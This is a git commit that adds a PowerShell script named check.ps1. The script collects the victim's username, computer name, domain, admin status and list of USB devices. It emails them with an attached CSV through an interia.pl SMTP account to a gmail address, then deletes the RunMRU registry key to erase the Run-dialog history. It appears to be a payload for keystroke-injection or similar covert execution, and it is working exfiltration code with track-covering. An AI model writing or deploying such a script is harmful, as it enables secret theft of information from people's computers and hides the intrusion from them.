6136ce2d7047e5f7ceadb6fa6013434f7bb600b8
dadmins1984 <116805139+dadmins1984@users.noreply.github.com>
2022-11-24 09:02:19 +0100

    Create check.ps1

---
+++ check.ps1
@@ -0,0 +1,48 @@
+$SmtpServer = "poczta.interia.pl" ; $SmtpPort = "587"
+$secpasswd = ConvertTo-SecureString $Password -AsPlainText -Force
+$user = $u + "@interia.pl"
+$cred = New-Object System.Management.Automation.PSCredential ($user, $secpasswd)
+$Subject = "WiFi"
+$To = $T + "@gmail.com"
+
+$name = $env:UserName
+$computername = $env:ComputerName
+$domain = $env:USERDOMAIN
+$admin = "No admin"
+
+function is_admin
+{
+Param($a)
+$t = Get-LocalGroupMember -Group $a | Select-Object Name
+$t.Name -ccontains "$env:ComputerName\$env:UserName"
+}
+
+
+if ($computername -eq $domain) {
+if ($PSUICulture -eq "pl-PL")
+{
+if (is_admin -a 'Administratorzy'-eq $true)
+{
+$admin = "Is admin"
+}
+}
+else 
+{
+if (is_admin -a 'Administrators'-eq $true)
+{
+$admin = "Is admin"
+}
+}
+}
+else
+{
+$admin = "Domain user"
+}
+
+$u = Get-PnpDevice -PresentOnly | Where-Object { $_.InstanceId -match '^USB' }
+$F2 = "$env:USERNAME-USB.csv"
+$u | Export-Csv -Path "$env:tmp/$F2" -NoTypeInformation
+$Body = "<h3>Username: 3333<br>ComputerName: ::<br>Domain: :::<br>Admin: ::::</h3>" -replace "3333",$name  -replace "::",$computername -replace ":::",$domain -replace "::::",$admin
+
+Send-MailMessage -From $user -to $To -Subject $Subject -Body $Body -SmtpServer $SMTPServer -port $SMTPPort -Credential $cred -UseSsl -BodyAsHtml -Attachments "$env:tmp/$F2"
+reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
